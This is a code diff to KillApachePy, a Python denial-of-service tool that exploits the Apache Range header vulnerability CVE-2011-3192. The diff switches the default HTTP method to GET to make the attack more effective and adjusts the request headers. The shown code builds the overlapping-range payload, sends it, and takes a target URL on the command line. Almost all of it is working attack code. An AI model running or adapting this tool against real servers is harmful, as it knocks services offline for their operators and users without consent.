@@ -6,14 +6,14 @@ NAME        = "KillApachePy (Range Header DoS CVE-2011-3192)"
 VERSION     = "0.1c"
 AUTHOR      = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
 LICENSE     = "Public domain (FREE)"
-SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better. Also, GET method seems to be more promising than default HEAD"
+SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better"
 REFERENCE   = "http://seclists.org/fulldisclosure/2011/Aug/175"
 
 SLEEP_TIME      = 3     # time to wait for new thread slots (after max number reached)
 RANGE_NUMBER    = 1024  # number of range subitems forming the DoS payload
 USER_AGENT      = "KillApachePy (%s)" % VERSION
 
-def attack(url, user_agent=None, method='HEAD', proxy=None):
+def attack(url, user_agent=None, method='GET', proxy=None):
     if '://' not in url:
         url = "http://%s" % url
 
@@ -31,7 +31,7 @@ def attack(url, user_agent=None, method='HEAD', proxy=None):
 
     class _MethodRequest(urllib2.Request):
         '''
-        Create non-GET/POST (e.g. HEAD/PUT/DELETE) requests with urllib2
+        Create any HTTP (e.g. HEAD/PUT/DELETE) request type with urllib2
         '''
         def set_method(self, method):
             self.method = method.upper()
@@ -47,7 +47,7 @@ def attack(url, user_agent=None, method='HEAD', proxy=None):
             print "(i) Checking target for vulnerability..."
         payload = "bytes=0-,%s" % ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
         try:
-            headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload, 'Accept-Encoding': 'gzip' }
+            headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload, 'Accept-Encoding': 'gzip, deflate' }
             req = _MethodRequest(url, None, headers)
             req.set_method(method)
             response = urllib2.urlopen(req)
@@ -99,7 +99,7 @@ def main():
     parser = optparse.OptionParser(version=VERSION)
     parser.add_option("-u", dest="url", help="Target url (e.g. \"http://www.target.com/index.php\")")
     parser.add_option("--agent", dest="agent", help="User agent (e.g. \"Mozilla/5.0 (Linux)\")")
-    parser.add_option("--method", dest="method", default='HEAD', help="HTTP method used (default: HEAD)")
+    parser.add_option("--method", dest="method", default='GET', help="HTTP method used (default: GET)")
     parser.add_option("--proxy", dest="proxy", help="Proxy (e.g. \"http://127.0.0.1:8118\")")
     options, _ = parser.parse_args()
     if options.url:
